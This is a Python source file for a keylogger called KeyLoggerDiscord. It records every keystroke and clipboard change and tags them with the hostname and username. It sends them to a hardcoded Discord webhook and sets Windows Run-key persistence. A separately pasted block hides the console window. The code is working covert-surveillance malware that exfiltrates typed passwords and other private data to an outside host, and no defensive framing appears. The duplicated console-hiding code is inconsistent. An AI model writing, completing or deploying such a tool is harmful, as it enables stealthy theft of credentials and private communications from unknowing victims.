
import sys
import os

def hide_console():
    """Hide console window for truly silent execution."""
    if hasattr(sys, 'frozen'):
        import ctypes
        from ctypes import wintypes

        kernel32 = ctypes.WinDLL("kernel32")
        user32 = ctypes.WinDLL("user32")

        # Get console window handle
        hwnd = kernel32.GetConsoleWindow()
        if not hwnd:
            return

        # Hide the console window itself
        user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0

        # Optional: Remove from Alt+Tab and taskbar
        style = user32.GetLongPtrW(hwnd + 24)  # offsetof(window_flags)
        user32.SetWindowLongPtrW(
            hwnd,
            -1,  # GWL_EXSTYLE
            (style | 0x00080000) & ~0x00000100  # WS_EX_TOOLWINDOW instead of WS_EX_APPWINDOW
        )
        user32.SetWindowPos(
            hwnd,
            None,
            0, 0, 0, 0,
            0x0075,  # SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_FRAMECHANGED
            None
        )

# Hide console *before* main code runs (if frozen)
if getattr(sys, 'frozen', False):
    hide_console()







#!/usr/bin/env python3
"""
keylogger_discord.py

A cross-platform keylogger that sends keystrokes to Discord webhooks,
with optional persistence, clipboard monitoring, sensitive data masking,
and fallback logging.

Usage:
    python keylogger_discord.py [--hide] [--no-persistence]

Requirements:
    pynput, requests — see requirements.txt
"""

import os
import sys
import json
import re
import time
import threading
from datetime import datetime
from collections import deque
from typing import Optional

# --- Configuration (customize or override via env vars) ---
WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK", "https://discord.com/api/webhooks/1571580900817248266/NBjcx70S5YWe7eHyQMF3emSnICalCLD4D5upI8UXCSXsNr5yq4NCY4XfnoYBREC_fWUY")
WEBHOOK_FALLBACK = os.getenv("DISCORD_FALLBACK_WEBHOOK", "")  # optional secondary webhook
SEND_INTERVAL_SEC = int(os.getenv("SEND_INTERVAL_SEC", "60"))
MAX_KEYS_PER_MSG = int(os.getenv("MAX_KEYS_PER_MSG", "200"))
LOG_FILE = os.getenv("KEYLOG_LOG_FILE", "keylog.txt")

# Mask patterns (regex) for sensitive data — will replace matches with [MASKED]
SENSITIVE_PATTERNS = [
    # Emails
    r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+",
    # URLs (HTTP/HTTPS)
    r"https?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),])+(?:/[a-zA-Z0-9_./%-]*)?",
    # Windows paths
    r"[a-zA-Z]:\\(?:[a-zA-Z0-9_\-\\\.]+)+",
]

# Discord emoji mapping for key types
KEY_EMOJI = {
    "space": "␣",
    "enter": "\n",
    "backspace": "⌫",
    "tab": "⇆",
    "shift": "⇧",
    "caps_lock": "⇪",
    "ctrl": "⌃",
    "alt": "⌥",
    "win": "❖",
    "esc": "⎋",
    "delete": "⌦",
}

# --- Imports with graceful fallbacks ---
try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError as e:
    print(f"[!] pynput not found: {e}")
    PYNPUT_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError as e:
    print(f"[!] requests not found: {e}")
    REQUESTS_AVAILABLE = False

# Platform detection
IS_WINDOWS = sys.platform.startswith("win")
IS_MACOS = sys.platform == "darwin"
IS_LINUX = sys.platform.startswith("linux")

# --- Logging Setup ---
import logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
logger = logging.getLogger(__name__)

# --- Global state ---
key_buffer: deque = deque()
lock = threading.Lock()  # for thread-safe buffer access
last_send_time = time.time()
clipboard_history: deque = deque(maxlen=20) if PYNPUT_AVAILABLE else None


def get_hostname() -> str:
    """Get system hostname."""
    import socket
    return socket.gethostname()


def get_username() -> str:
    """Get current OS username."""
    try:
        return os.getlogin()
    except OSError:
        # e.g., headless or service account
        return "unknown"


HOSTNAME = get_hostname()
USERNAME = get_username()


# --- Hidden Window (Windows only) ---
def hide_console():
    """Hide the console window on Windows (works for .py and .exe)."""
    if IS_WINDOWS and hasattr(sys, "frozen"):
        try:
            import ctypes
            user32 = ctypes.windll.user32
            # Get handle to console window
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                # Hide: SW_HIDE=8, SW_MINIMIZE=7
                user32.ShowWindow(hwnd, 8)  # SW_HIDE
        except Exception as e:
            logger.warning(f"Failed to hide console: {e}")


# --- Persistence (Auto-start on login) ---
def setup_persistence():
    """Add keylogger to startup for persistence."""
    if not IS_WINDOWS:
        return

    import winreg as reg

    script_path = os.path.abspath(sys.argv[0])
    app_name = "KeyLoggerDiscord"

    # Paths
    startup_reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with reg.OpenKey(reg.HKEY_CURRENT_USER, startup_reg_key, 0, reg.KEY_WRITE) as key:
            # Determine command line (hide console if needed)
            cmd = f'"{sys.executable}" "{script_path}" --hide'
            reg.SetValueEx(key, app_name, 0, reg.REG_SZ, cmd)
        logger.info(f"✅ Persistence enabled: {startup_reg_key}\\{app_name}")
    except Exception as e:
        logger.error(f"❌ Failed to set persistence: {e}")


# --- Logging to File ---
def log_to_file(text: str):
    """Append text to local log file."""
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"{datetime.now().isoformat()} | {HOSTNAME}/{USERNAME} | {text}\n")
    except Exception as e:
        logger.error(f"Failed to write to log file: {e}")


# --- Discord Webhook Helpers ---
def mask_sensitive(text: str) -> str:
    """Mask sensitive patterns in text."""
    for pattern in SENSITIVE_PATTERNS:
        matches = list(re.finditer(pattern, text))
        for match in reversed(matches):  # reverse to not mess up indices
            start, end = match.span()
            masked = "[MASKED]"
            if "email" in pattern.lower():
                masked += "📧"
            elif "http" in pattern.lower() or "url" in pattern.lower():
                masked += "🔗"
            else:
                masked += "📎"
            text = text[:start] + masked + text[end:]
    return text


def build_embed(content: str) -> dict:
    """Build a Discord embed for keypress log."""
    # Truncate content if too long
    truncation_note = ""
    if len(content) > MAX_KEYS_PER_MSG:
        content = content[-MAX_KEYS_PER_MSG:]
        truncation_note = f" (last {MAX_KEYS_PER_MSG} chars)"

    # Add timestamp and metadata to title
    now = datetime.now()
    ts = now.isoformat(timespec="seconds")
    title = f"[{HOSTNAME}] Keystrokes — {USERNAME}"
    if "clipboard" in content.lower():
        title = f"[ Clipboard Update ] — {title}"

    embed = {
        "embeds": [{
            "title": title,
            "description": f"> `{content[:1900]}`",  # Discord message limit ~2000
            "color": 5763719,  # green-ish
            "timestamp": ts,
            "footer": {
                "text": f"KeyLogger v1.0 • {HOSTNAME} • {ts}"
            }
        }],
        "content": f"`{truncation_note}`"
    }

    # Optional: add key-category emojis to description (see below)
    return embed


def send_to_discord(text: str, webhook_url: Optional[str] = None) -> bool:
    """Send text payload to Discord webhook with retry logic."""
    if not REQUESTS_AVAILABLE:
        log_to_file(f"[DISCORD FALLBACK] {text}")
        return True

    url = webhook_url or WEBHOOK_URL
    if not url:
        logger.info("No webhook URL set — logging to file instead.")
        log_to_file(text)
        return False

    max_retries = 3
    delay_base = 2.0

    for attempt in range(max_retries):
        try:
            embed = build_embed(text)
            payload = json.dumps(embed, indent=None)

            headers = {
                "Content-Type": "application/json",
                "User-Agent": "KeyLoggerDiscord/1.0"
            }

            response = requests.post(
                url,
                data=payload,
                headers=headers,
                timeout=10
            )

            if 200 <= response.status_code < 300:
                logger.info(f"✅ Sent to Discord ({response.status_code})")
                return True
            else:
                raise Exception(f"Discord API returned {response.status_code}: {response.text}")

        except requests.RequestException as e:
            logger.warning(
                f"[Attempt {attempt + 1}/{max_retries}] "
                f"Failed to send webhook: {e}"
            )
            if attempt < max_retries - 1:
                time.sleep(delay_base * (attempt + 1))
        except Exception as e:
            logger.error(f"Unexpected error sending to Discord: {e}")

    # Fallback on final failure
    fallback_text = f"[Webhook Failed]\n{datetime.now().isoformat()}\n{HOSTNAME}/{USERNAME}\n---\n{text[:2000]}"
    log_to_file(fallback_text)
    if WEBHOOK_FALLBACK:
        logger.info("Sending to fallback webhook...")
        send_to_discord(fallback_text, WEBHOOK_FALLBACK)

    return True


# --- Key Detection & Buffering ---
def format_key(key) -> str:
    """Convert pynput key object to readable string."""
    try:
        if hasattr(key, "char") and key.char:
            # Regular alphanumeric
            ch = key.char
            return ch
        elif hasattr(key, "name"):
            name = key.name.lower()
            emoji = KEY_EMOJI.get(name, "")
            return f"[{key.name.upper()}]{emoji}"
    except Exception as e:
        logger.debug(f"Error formatting key {key}: {e}")
        return str(key)

    return ""


def on_key_press(key):
    """Called when a key is pressed."""
    try:
        # Format and escape
        text = format_key(key)
        if not text:
            return

        with lock:
            key_buffer.append(text)
    except Exception as e:
        logger.error(f"Error in on_key_press: {e}")


def on_key_release(key):
    """Optional — handles release events (e.g., for modifier release indicators)."""
    # Could add special handling (e.g., track held modifiers)


# --- Clipboard Monitoring (Cross-Platform) ---
try:
    if IS_WINDOWS or IS_LINUX:
        from pynput import mouse
        HAS_MOUSE = True
except ImportError:
    HAS_MOUSE = False


def monitor_clipboard():
    """Monitor clipboard changes and send updates."""
    if not PYNPUT_AVAILABLE:
        return

    try:
        # Try pyperclip or clipboard first; fallback to custom polling
        import pyperclip as clip
    except ImportError:
        logger.info("pyperclip not found — clipboard monitoring skipped.")
        return

    last_content = clip.paste()
    while True:
        time.sleep(1.5)
        try:
            current = clip.paste()
            if current != last_content:
                # Only send meaningful changes
                if len(current) > 2 and not current.isspace():
                    msg = f"Clipboard changed: {current}"
                    send_to_discord(mask_sensitive(msg))
                    last_content = current
        except Exception as e:
            logger.warning(f"[Clipboard] Error monitoring: {e}")


# --- Sending Logic ---
def send_buffered_keys():
    """Send buffered keystrokes to Discord (periodic)."""
    global last_send_time

    while True:
        try:
            time.sleep(SEND_INTERVAL_SEC)
            now = time.time()
            if now - last_send_time >= SEND_INTERVAL_SEC:
                flush_key_buffer()
        except Exception as e:
            logger.error(f"[Send Loop] Error: {e}")


def flush_key_buffer():
    """Flush current key buffer to Discord."""
    with lock:
        if not key_buffer:
            return

        # Join buffer into string
        chars = list(key_buffer)
        content = "".join(chars)

        # Clean up (optional)
        # Replace newlines for cleaner embeds
        content = content.replace("\n", "\\n")
        content = re.sub(r"\[([A-Z_]+)\]", r"[\1]", content)  # clean [ENTER] → [ENTER]

        # Mask sensitive data if desired (e.g., URLs/email)
        content = mask_sensitive(content)

        send_to_discord(content)

        # Clear buffer after sending
        key_buffer.clear()
        logger.info(f"Sent {len(chars)} keys")


# --- Main Loop ---
def main():
    """Entry point."""
    print("=" * 50)
    print("🔑 KeyLoggerDiscord v1.0 — Listening...")
    print("   🌐 Webhook:", WEBHOOK_URL or "Not set → file fallback")
    print(f"   ⏱️  Batch every {SEND_INTERVAL_SEC} sec")
    print(f"   📝 Max chars per msg: {MAX_KEYS_PER_MSG}")
    if IS_WINDOWS:
        print("   🪟 Platform: Windows")
    elif IS_MACOS:
        print("   🍎 Platform: macOS")
    else:
        print("   🐧 Platform: Linux")

    # Hide console (Windows only)
    if "--hide" in sys.argv and IS_WINDOWS:
        hide_console()

    # Set up persistence
    if "--no-persistence" not in sys.argv and IS_WINDOWS:
        setup_persistence()

    # Start clipboard monitor thread
    if HAS_MOUSE or PYNPUT_AVAILABLE:
        threading.Thread(target=monitor_clipboard, daemon=True).start()
        logger.info("🎧 Clipboard monitoring started")

    # Set up keyboard listener (pynput)
    with keyboard.Listener(
            on_press=on_key_press,
            on_release=on_key_release
    ) as listener:
        logger.info("Keyboard listener active.")
        # Start background sender thread
        threading.Thread(target=send_buffered_keys, daemon=True).start()

        # Keep main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n🛑 Stopping keylogger...")
            flush_key_buffer()
            logger.info("✅ Shutdown complete.")


if __name__ == "__main__":
    main()
